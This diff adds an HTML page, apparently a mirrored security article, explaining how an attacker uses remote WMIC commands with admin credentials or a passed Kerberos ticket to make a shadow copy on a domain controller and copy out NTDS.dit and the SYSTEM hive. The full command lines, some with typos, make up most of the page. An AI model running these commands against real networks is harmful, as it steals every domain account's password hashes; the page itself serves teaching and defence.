@@ -1,0 +1,43 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Pulling ntds.dit Using VSS Shadow Copy</title>
+</head><body>Windows has a built-in management component called <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa394582%28v=vs.85%29.aspx">WMI </a>that enables remote execution (admin rights required). WMIC is the WMI command tool to execute commands on remote computers.<br/>
+&nbsp;<br/>
+Matt Graeber presented on leveraging WMI for offensive purposes at Black Hat USA 2015 (<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf">paper</a>, <a href="https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor.pdf">slides</a>, and <a href="https://www.youtube.com/watch?v=pqth74Uzxy4">video</a>). Matt also spoke at DEF CON 23 (<a href="https://www.youtube.com/watch?v=xBd6p-Lz3kE">video</a>) with colleagues and dove further into offensive WMI capability (and again at DerbyCon – <a href="https://www.youtube.com/watch?v=3UZ3Afm5hO4">video</a>)<br/>
+&nbsp;<br/>
+Leverage WMIC (or PowerShell remoting) to Create (or copy existing) VSS.<br/>
+wmic /node:&lt;node&gt; /user:&lt;domain&gt;\&lt;user&gt; /password:&lt;password&gt; process call create "cmd /c vssadmin create shadow /for"c: 2&gt;&amp;1 c:\vss.log"<br/>
+<a href="https://adsecurity.org/wp-content/uploads/2016/01/WMIC-PowerShell-Execute-VSSAdmin.png"><img src="https://adsecurity.org/wp-content/uploads/2016/01/WMIC-PowerShell-Execute-VSSAdmin.png" width="963" height="129" /></a><br/>
+&nbsp;<br/>
+<img src="image.png" /><br/>
+<br/>
+Once the VSS snapshot has completed, we then copy the NTDS.dit file and the System registry hive out of the VSS to the c: drive on the DC.<a href="https://adsecurity.org/wp-content/uploads/2016/01/WMIC-PowerShell-Copy-ntdsdit-file.png"><img src="https://adsecurity.org/wp-content/uploads/2016/01/WMIC-PowerShell-Copy-ntdsdit-file.png" width="962" height="127" /></a><a href="https://adsecurity.org/wp-content/uploads/2016/01/WMIC-PowerShell-Copy-system-registryhive.png"><img src="https://adsecurity.org/wp-content/uploads/2016/01/WMIC-PowerShell-Copy-system-registryhive.png" width="962" height="140" /><br/>
+</a><br/>
+wmic /node:&lt;node&gt; /user:&lt;domain&gt;\&lt;user&gt; /password:&lt;password&gt; process call create "cmd /c copy \\?\GLOBALROOT\Device\HardiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\windows\temp\NTDS.dit 2&gt;&amp;1 &gt; C:\vss2.log"<br/>
+<img src="image 2.png" /><br/>
+<br/>
+<br/>
+wmic /node:&lt;node&gt; /user:&lt;domain&gt;\&lt;user&gt; /password:&lt;password&gt; process call create "cmd /c copy \\?\GLOBALROOT\Device\HardiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\windows\temp\SYSTEM.hive 2&gt;&amp;1 &gt; C:\vss2.log"<br/>
+<img src="image 3.png" /><br/>
+<br/>
+After the files are in the c:\temp folder on the DC, we copy the files to local computer.<br/>
+<br/>
+copy \\&lt;computer&gt;\c$\windows\temp\ntds.dit c:\temp<br/>
+copy \\&lt;computer&gt;\c$\windows\temp\system.hive c:\temp <br/>
+<a href="https://adsecurity.org/wp-content/uploads/2016/01/WMIC-PowerShell-Copy-files-from-DC-to-local.png"><img src="https://adsecurity.org/wp-content/uploads/2016/01/WMIC-PowerShell-Copy-files-from-DC-to-local.png" width="594" height="29" /></a><br/>
+<img src="image 4.png" /><br/>
+<br/>
+This screenshot shows the attacker used the clear text password discovered earlier using <a href="https://adsecurity.org/?page_id=1821">Mimikatz</a>. What if we don’t have that?<br/>
+&nbsp;<br/>
+The attacker can pass a Kerberos ticket with WMIC to do the same thing.<br/>
+<br/>
+wmic /authority:"kerberos:&lt;domain&gt;\&lt;computer&gt;" /node:&lt;computer&gt; process call create "cmd /c copy \\?\GLOBALROOT\Device\HardDisk\VolumeShadowCopy1\Windows\NTDS.dit c:\windows\temp\ntds.dit 2&gt;%1"<br/>
+<img src="image 5.png" /><br/>
+<br/>
+wmic /authority:"kerberos:&lt;domain&gt;\&lt;computer&gt;" /node:&lt;computer&gt; process call create "cmd /c vssadmin create shadow /for=c: 2&gt;&amp;1" <img src="image 6.png" /><br/>
+<a href="https://adsecurity.org/wp-content/uploads/2016/01/WMIC-PTT-Execute-VSSAdmin-02.png"><img src="https://adsecurity.org/wp-content/uploads/2016/01/WMIC-PTT-Execute-VSSAdmin-02.png" width="796" height="126" /></a><br/>
+&nbsp;<br/>
+Note that<a href="https://technet.microsoft.com/en-us/library/hh831568.aspx">&nbsp;with newer versions of Windows, WMIC is deprectated</a>. PowerShell provides the same functionality with the <i>Invoke-WMIMethod</i>&nbsp;<i>cmdlet</i>.<br/>
+</body></html>
